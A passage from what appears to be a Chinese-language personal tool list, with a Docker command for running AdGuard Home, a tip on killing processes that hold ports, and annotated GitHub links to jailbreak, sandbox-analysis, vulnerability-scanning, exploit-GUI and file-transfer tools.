docker run --name adguardhome     -v /my/own/workdir:/opt/adguardhome/work     -v /my/own/confdir:/opt/adguardhome/conf     -p 54:53/tcp -p 54:53/udp     -p 80:80/tcp -p 3000:3000/tcp     -p 67:67/udp -p 69:68/tcp -p 69:68/udp     -p 443:443/tcp     -p 853:853/tcp     -d adguard/adguardhome

```


> 端口占用问题:
查看当前占用端口命令
```
netstat -tanlp
```
杀死进程(注意不是杀死端口，而是pid的端口)
```
kill 1785进程 (自己的pid端口)
```


- [ipwndfu](https://github.com/axi0mX/ipwndfu)

    > 适用于许多iOS设备的开源越狱工具

- [sandbox-attacksurface-analysis-tools](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)

    > 用于分析Windows沙箱的暴露攻击面的工具集。

# 编程/安全开发

**语言**

- [Microsoft Power Fx](https://github.com/microsoft/Power-Fx)

    > Power Fx低代码编程语言


**服务器**

- [server](https://github.com/bitwarden/server)

    > 核心基础架构后端（API，数据库，Docker等）。

- [croc](https://github.com/schollz/croc)

    > 轻松安全地将事物从一台计算机发送到另一台计算机


- [ExpDemo-JavaFX](https://github.com/yhy0/ExpDemo-JavaFX)

    > 构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。

- [qrcp](https://github.com/claudiodangelis/qrcp)
    > 通过wifi传文件

- [开发小工具,ui挺好看的](https://github.com/veler/DevToys)

- [crlf 漏扫工具](https://github.com/dwisiswant0/crlfuzz)

- [生成json格式数据的小工具](https://github.com/jpmens/jo)


















